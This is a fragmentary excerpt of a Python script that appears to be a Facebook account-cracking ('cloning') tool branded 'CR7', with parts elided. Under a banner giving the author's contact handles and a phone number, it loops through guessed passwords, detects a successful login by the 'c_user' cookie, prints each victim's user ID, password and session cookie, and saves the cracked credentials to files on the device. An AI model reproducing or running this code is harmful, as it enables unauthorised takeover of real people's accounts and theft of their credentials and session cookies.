...
╠══[Facebook:=====================> Cr      ║  \033[1;97m

╠══[Github:=======================> \33[1;38mK-A-W-S-A-R     ║\33[1;34m

╠══[Whatsapp:=====================> 01796953089    ║\33[1;35m
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\r\033[1;32m[CR7-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')

                cek_apk(session,coki)

                open('/sdcard/CR7-OK.txt', 'a').write( uid+' | '+ps+'\n')
                ...
                open('/sdcard/CR7-CP.txt', 'a').write( uid+' | '+ps+' \n')
        ...
        sys.stdout.write(f'\r\r%s{x}[{xr}CR7{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
